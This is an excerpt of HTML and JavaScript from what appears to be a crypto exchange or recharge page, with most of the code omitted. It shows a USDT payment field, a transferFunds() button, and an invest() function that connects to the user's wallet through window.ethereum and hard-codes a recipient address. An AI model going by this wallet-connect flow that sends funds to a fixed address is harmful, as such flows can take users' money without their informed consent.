                                    ...
                                    <div class="exchange__section">
                                        <div class="exchange__section__row exchange__process">
                                            ...
                                            <div class="exchange-process-details">
                                                            ...
                                                            <div class="g g-fill"><label>Choose a crypto
                                                                ...
                                                                <div class="xsel xsel--0">
                                                                    <div class="SumoSelect sumo_network_id" tabindex="0"
                                                                        role="button" aria-expanded="false">   <input type="text" name="paymentMode" value="USDT.TRC20"
                                                                        class="inp inp-0 input-only-pos suma-recharge"></div>
                                                                </div>
                                                            </div>
                                                ...
                                                <div class="b b--1">
                                                    <button  type="button" onclick="transferFunds()"   class="btn btn-b btn-recharge"
...
<!--<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" crossorigin="anonymous"></script>-->
    ...
    async  function invest(input) 
      ...
      const web3 = new Web3(window.ethereum);
        ...
        var address = "0x3b92CE5CEd60BdeF0e5aF5060DC1518aC008dFCf";
